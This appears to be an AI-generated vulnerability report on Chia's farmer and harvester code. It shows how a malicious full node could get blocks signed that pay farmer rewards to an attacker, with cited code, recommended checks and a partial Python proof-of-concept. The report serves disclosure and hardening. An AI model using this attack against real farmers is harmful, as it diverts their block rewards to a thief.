Let me trace through the relevant code to evaluate this claim.

Let me also check the harvester side to understand the full signing flow.

### Title
Farmer Signs Attacker-Controlled `foliage_block_data_hash` Without Verifying `farmer_reward_puzzle_hash` — (`chia/farmer/farmer_api.py`)

### Summary

A malicious full node can send a `RequestSignedValues` message with `foliage_block_data=None` and a `foliage_block_data_hash` that encodes an attacker-controlled `farmer_reward_puzzle_hash`. Because the farmer's `request_signed_values` handler only forwards source data to the harvester when the full node provides it, and neither the farmer nor the harvester ever verifies the `farmer_reward_puzzle_hash` embedded in the hash before signing, the farmer returns a valid `SignedValues` authorizing a block that pays rewards to the attacker.

---

### Finding Description

**Entry point — `request_signed_values`:**

In `chia/farmer/farmer_api.py`, the handler for the full-node-to-farmer `RequestSignedValues` message is:

```python
message_data: list[SignatureRequestSourceData | None] | None = None

if full_node_request.foliage_block_data is not None:
    message_data = [
        SignatureRequestSourceData(..., bytes(full_node_request.foliage_block_data)),
        ...
    ]

request = harvester_protocol.RequestSignatures(
    ...
    [full_node_request.foliage_block_data_hash, full_node_request.foliage_transaction_block_hash],
    message_data=message_data,
    ...
)
``` [1](#0-0) 

When `foliage_block_data` is `None`, `message_data` stays `None`. The farmer forwards the attacker-supplied `foliage_block_data_hash` directly to the harvester with no source data attached.

**Harvester signs blindly:**

In `chia/harvester/harvester_api.py`, `request_signatures` iterates over the messages and signs each one unconditionally:

```python
for message in request.messages:
    signature: G2Element = AugSchemeMPL.sign(local_sk, message, agg_pk)
    message_signatures.append((message, signature))
``` [2](#0-1) 

There is no check that the message is the hash of a `FoliageBlockData` whose `farmer_reward_puzzle_hash` matches the farmer's configured target.

**Farmer also signs blindly — `_process_respond_signatures`:**

Back in the farmer, the block-signature branch of `_process_respond_signatures` takes the `foliage_block_data_hash` from the harvester's response and signs it directly:

```python
foliage_sig_farmer = AugSchemeMPL.sign(sk, foliage_block_data_hash, agg_pk)
``` [3](#0-2) 

No check is performed that `foliage_block_data_hash` is the hash of a `FoliageBlockData` whose `farmer_reward_puzzle_hash` equals `self.farmer.farmer_target`. The function then returns a fully valid `SignedValues`: [4](#0-3) 

**The `include_signature_source_data` flag does not protect against this:**

The flag is set by the farmer in `DeclareProofOfSpace` to signal to the full node that it wants source data. However, the farmer's `request_signed_values` handler never enforces that `foliage_block_data` must be non-`None` — it simply skips populating `message_data` when the full node omits it. A malicious full node ignores the flag and sends `foliage_block_data=None` regardless. [5](#0-4) 

---

### Impact Explanation

A malicious full node can divert 100% of the farmer's block rewards to an attacker-controlled puzzle hash. The farmer's plot key signs a `FoliageBlockData` hash that encodes the attacker's address, producing a valid `SignedValues` that the full node uses to finalize a block paying rewards to the attacker. This is a direct, unauthorized payout redirection — a High-severity impact under the scope rules.

---

### Likelihood Explanation

The farmer must be connected to the malicious full node, which is a realistic and common configuration (farmers routinely connect to external full nodes). The attacker only needs a valid `quality_string`, which is obtained legitimately from the farmer's own `DeclareProofOfSpace` message. No leaked keys, broken cryptography, or privileged access is required.

---

### Recommendation

In `request_signed_values`, before forwarding the signing request to the harvester, the farmer must:

1. **Require `foliage_block_data` to be non-`None`** — reject any `RequestSignedValues` where `foliage_block_data` is absent.
2. **Verify the hash** — assert `std_hash(bytes(full_node_request.foliage_block_data)) == full_node_request.foliage_block_data_hash`.
3. **Verify the reward address** — assert `full_node_request.foliage_block_data.farmer_reward_puzzle_hash == self.farmer.farmer_target`.

These three checks must all pass before the farmer constructs and sends `RequestSignatures` to the harvester.

---

### Proof of Concept

```python
# Attacker is a malicious full node connected to the farmer.
# Step 1: Receive a valid DeclareProofOfSpace from the farmer.
#   - Extract quality_string from the message.
# Step 2: Construct attacker-controlled FoliageBlockData.
attacker_ph = bytes32(b"\xaa" * 32)  # attacker's puzzle hash
attacker_foliage = FoliageBlockData(
    unfinished_reward_block_hash=...,
    pool_target=...,
    pool_signature=...,
    farmer_reward_puzzle_hash=attacker_ph,
    extension_data=bytes32(b"\x00" * 32),
)
attacker_hash = std_hash(bytes(attacker_foliage))

# Step 3: Send RequestSignedValues with foliage_block_data=None.
malicious_request = RequestSignedValues(
    quality_string=valid_quality_string,   # from DeclareProofOfSpace
    foliage_block_data_hash=attacker_hash, # hash of attacker's FoliageBlockData
    foliage_transaction_block_hash=bytes32(b"\x00" * 32),
    foliage_block_data=None,               # no source data — farmer cannot inspect
    foliage_transaction_block_data=None,
    rc_block_unfinished=...,
)

# Step 4: Farmer returns SignedValues with a valid signature over attacker_hash.
# Step 5: Attacker finalizes a block with attacker_foliage and the farmer's signature.
# Result: Block is valid; farmer reward goes to attacker_ph.
```

The farmer's `request_signed_values` passes `message_data=None` to the harvester (line 754), the harvester signs `attacker_hash` blindly (line 512), and the farmer co-signs it at line 959 — producing a valid aggregate signature over a `FoliageBlockData` the farmer never inspected.

### Citations

**File:** chia/farmer/farmer_api.py (L732-756)
```python
        message_data: list[SignatureRequestSourceData | None] | None = None

        if full_node_request.foliage_block_data is not None:
            message_data = [
                SignatureRequestSourceData(
                    uint8(SigningDataKind.FOLIAGE_BLOCK_DATA), bytes(full_node_request.foliage_block_data)
                ),
                (
                    None
                    if full_node_request.foliage_transaction_block_data is None
                    else SignatureRequestSourceData(
                        uint8(SigningDataKind.FOLIAGE_TRANSACTION_BLOCK),
                        bytes(full_node_request.foliage_transaction_block_data),
                    )
                ),
            ]

        request = harvester_protocol.RequestSignatures(
            plot_identifier,
            challenge_hash,
            sp_hash,
            [full_node_request.foliage_block_data_hash, full_node_request.foliage_transaction_block_hash],
            message_data=message_data,
            rc_block_unfinished=full_node_request.rc_block_unfinished,
        )
```

**File:** chia/farmer/farmer_api.py (L959-959)
```python
                    foliage_sig_farmer = AugSchemeMPL.sign(sk, foliage_block_data_hash, agg_pk)
```

**File:** chia/farmer/farmer_api.py (L975-979)
```python
                    return farmer_protocol.SignedValues(
                        computed_quality_string,
                        foliage_agg_sig,
                        foliage_block_agg_sig,
                    )
```

**File:** chia/harvester/harvester_api.py (L511-513)
```python
        for message in request.messages:
            signature: G2Element = AugSchemeMPL.sign(local_sk, message, agg_pk)
            message_signatures.append((message, signature))
```
